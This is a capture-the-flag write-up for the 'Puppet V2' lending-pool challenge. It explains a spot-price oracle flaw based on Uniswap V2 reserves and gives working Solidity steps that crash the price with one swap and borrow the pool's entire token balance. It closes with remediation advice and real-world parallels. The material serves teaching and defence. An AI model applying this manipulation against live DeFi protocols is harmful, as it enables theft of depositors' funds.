# 09 — Puppet V2

**Class:** Spot-price oracle manipulation (Uniswap V2 reserve ratio as price feed)
**Goal:** Drain the lending pool's 1,000,000 DVT into the recovery account.

## The setup

`PuppetV2Pool` lets you borrow DVT against **3x its value in WETH** as
collateral, using the "official" Uniswap V2 utility libraries instead of
hand-rolled math:

```solidity
function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
    uint256 depositFactor = 3;
    return _getOracleQuote(tokenAmount) * depositFactor / 1 ether;
}

function _getOracleQuote(uint256 amount) private view returns (uint256) {
    (uint256 reservesWETH, uint256 reservesToken) =
        UniswapV2Library.getReserves(_uniswapFactory, address(_weth), address(_token));
    return UniswapV2Library.quote(amount * 10 ** 18, reservesToken, reservesWETH);
}
```

Pool reserves start at **100 DVT / 10 WETH**. The player holds 10,000 DVT and
20 ETH; the lending pool holds 1,000,000 DVT.

## Root cause

Using "the recommended utility libraries" doesn't fix the underlying problem
from V1 — it's the same bug, just dressed up with real Uniswap V2 code
instead of a hand-written ratio. `UniswapV2Library.quote` still just reads
**instantaneous reserves**, with no TWAP, no minimum liquidity floor, and no
deviation check. The pool is tiny (100 DVT total), so a single large swap
against it moves the reported price by orders of magnitude — the library
being "official" says nothing about *when* or *how* you're allowed to call it.

## Exploit — dump, wrap, borrow

The player already holds far more DVT (10,000) than the pool has in reserve
(100), so selling all of it in one shot crashes the DVT/WETH price:

```solidity
token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);

address[] memory path = new address[](2);
path[0] = address(token);
path[1] = address(weth);

uniswapV2Router.swapExactTokensForETH({
    amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
    amountOutMin: 0,
    path: path,
    to: player,
    deadline: block.timestamp
});
```

That single swap (10,000 DVT in) leaves the pool at ~10,100 DVT / ~0.099 WETH,
crashing `calculateDepositOfWETHRequired(1_000_000e18)` from **300,000 ETH**
down to **~29.5 ETH**. The swap itself nets the player ~9.9 ETH, which added
to their original 20 ETH gives ~29.9 ETH — just enough:

```solidity
weth.deposit{value: player.balance}();                      // wrap ETH -> WETH

uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
weth.approve(address(lendingPool), depositRequired);
lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);              // drain all 1M DVT

token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
```

No flash loan needed this time — the player's *own* starting stack (10,000
DVT) is already enough to crash a 100-DVT pool by two orders of magnitude.

## Remediation

- **A price oracle must never be a single pool's spot reserve ratio**,
  official library or not. Use a Uniswap V2/V3 **TWAP** over a meaningful
  window, or an external feed (Chainlink) that isn't manipulable within one
  transaction.
- Require deep, protocol-owned or otherwise hard-to-move liquidity before
  treating a pool as a price reference, and add sanity bounds (min/max,
  circuit breakers) on the collateral factor derived from it.
- Treat "we used the recommended library" as solving the *math*, not the
  *trust model* — the library computes a correct ratio of whatever reserves
  it's given; it doesn't make those reserves manipulation-resistant.

## Real-world parallel

Identical failure to [Puppet](./07-puppet.md), just against Uniswap V2
instead of V1 — proof that swapping AMM versions doesn't fix a spot-oracle
design flaw. This exact pattern (dump into a thin pool, borrow against the
crashed/inflated price) is the root cause behind Harvest Finance, Cheese
Bank, Warp Finance and many other single-block oracle-manipulation drains.
